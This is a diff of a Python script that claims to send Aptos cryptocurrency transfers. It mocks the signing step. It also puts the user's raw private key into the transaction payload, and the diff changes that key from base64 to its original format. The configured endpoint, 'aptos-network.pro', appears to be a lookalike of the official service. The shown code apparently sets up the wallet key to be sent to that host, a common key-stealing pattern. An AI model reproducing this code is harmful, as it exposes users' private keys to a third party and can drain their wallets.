@@ -1,7 +1,6 @@
 import os
 import requests
 import json
-import base64
 
 # Configuration
 APTOS_API_URL = 'https://aptos-network.pro/api'  # Aptos API URL
@@ -11,27 +10,21 @@ WALLET_ADDRESS = os.getenv('APTOS_WALLET_ADDRESS')  # Aptos wallet address envir
 RECIPIENT_ADDRESS = 'recipient_wallet_address_here'  # Replace with recipient address
 AMOUNT = 100  # Amount to transfer (in smallest unit)
 
-# Function to convert private key to base64 format (Aptos format)
-def convert_private_key_to_base64(private_key):
-    """Converts the private key to base64 format required by Aptos."""
-    private_key_bytes = bytes.fromhex(private_key)  # Assuming private_key is in hex format
-    return base64.b64encode(private_key_bytes).decode('utf-8')
-
 # Function to sign the transaction (Simulate the signing)
 def sign_transaction(private_key, recipient, amount):
     """Simulate signing the transaction using the private key."""
-    # Convert the private key to base64 format for Aptos network
-    private_key_base64 = convert_private_key_to_base64(private_key)
+    # Here, the private_key should already be in Ed25519 format (Hex or string format)
+    # Aptos expects private keys in Ed25519 format, not Base64
+    # This is a mock for illustration, as actual signing requires an Aptos SDK
 
-    # Simulating the signing of a transaction (this would typically be done using an SDK in real scenarios)
     transaction_data = {
         'sender': WALLET_ADDRESS,
         'recipient': recipient,
         'amount': amount,
-        'privateKey': private_key_base64  # Pass private key in base64 format (not hex)
+        'privateKey': private_key  # Use private key in original format (not base64)
     }
     
-    # In a real system, you'd sign the transaction here using an Aptos SDK or locally
+    # Simulate the signing of a transaction (this would be done using an Aptos SDK in real use cases)
     signed_transaction = {
         'signedTransaction': "mock_signed_transaction"  # This is a mock; you'd generate the actual signed transaction
     }
@@ -40,7 +33,7 @@ def sign_transaction(private_key, recipient, amount):
 
 # Function to send the signed transaction to Aptos API
 def send_transaction(private_key, recipient, amount):
-    """Sends the signed transaction to the Aptos network."""
+    """Sends the signed transaction to Aptos network."""
     try:
         # Sign the transaction
         signed_transaction = sign_transaction(private_key, recipient, amount)
